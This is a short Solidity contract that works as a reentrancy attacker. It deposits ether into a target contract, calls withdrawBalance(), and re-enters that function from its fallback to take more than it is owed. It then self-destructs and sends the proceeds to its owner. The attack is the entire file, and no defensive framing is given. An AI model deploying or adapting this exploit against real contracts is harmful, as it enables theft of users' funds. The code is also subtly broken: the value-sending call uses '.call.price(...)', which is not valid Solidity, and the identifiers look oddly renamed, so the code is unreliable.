// SPDX-License-Identifier: MIT
pragma solidity ^0.4.15;

contract VaultGameoperator {
    bool public operationEnabled=false;
    address public aim_pact;
    address public owner;

    function VaultGameoperator() public{
        owner = msg.sender;
    }

    function depositGold(address _goal_pact) public payable{
        aim_pact = _goal_pact ;
        // call addToBalance with msg.value ethers
        require(aim_pact.call.price(msg.value)(bytes4(sha3("addToBalance()"))));
    }

    function launch_handler() public{
        operationEnabled = true;
        // call withdrawBalance

        require(aim_pact.call(bytes4(sha3("withdrawBalance()"))));
    }

    function () public payable{

        if (operationEnabled){
            operationEnabled = false;
                require(aim_pact.call(bytes4(sha3("withdrawBalance()"))));
        }
    }

    function retrieve_money(){
        suicide(owner);
    }

}